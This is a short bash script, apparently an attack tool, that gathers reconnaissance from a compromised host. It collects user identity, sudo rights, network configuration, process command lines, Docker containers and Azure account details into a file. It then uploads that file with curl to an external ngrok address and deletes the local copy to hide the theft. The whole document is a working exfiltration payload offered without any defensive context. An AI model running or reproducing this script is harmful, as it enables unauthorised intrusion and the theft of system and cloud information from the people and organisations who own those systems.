#!/bin/bash

EXFIL_FILE="exfil.txt"

run-cmd(){
    echo "[+] $@"
    $@
}


exfil(){

    run-cmd id
    run-cmd pwd
    run-cmd ip a
    run-cmd cat /etc/hosts
    run-cmd ls -asl ../
    run-cmd ls -asl ../../
    run-cmd ls -asl /home/
    run-cmd sudo -l
    run-cmd ps auxfw
    run-cmd cat /proc/*/cmdline
    run-cmd cat /proc/net/fib_trie
    run-cmd cat /proc/net/arp
    run-cmd docker ps -a
    run-cmd az account show
}

exfil > $EXFIL_FILE

http_status=$(curl -sk -o /dev/null -w "%{http_code}" -X POST -F "file=@$EXFIL_FILE" https://4b99cf5f96c9.ngrok-free.app/ -H 'ngrok-skip-browser-warning: 123')

rm $EXFIL_FILE
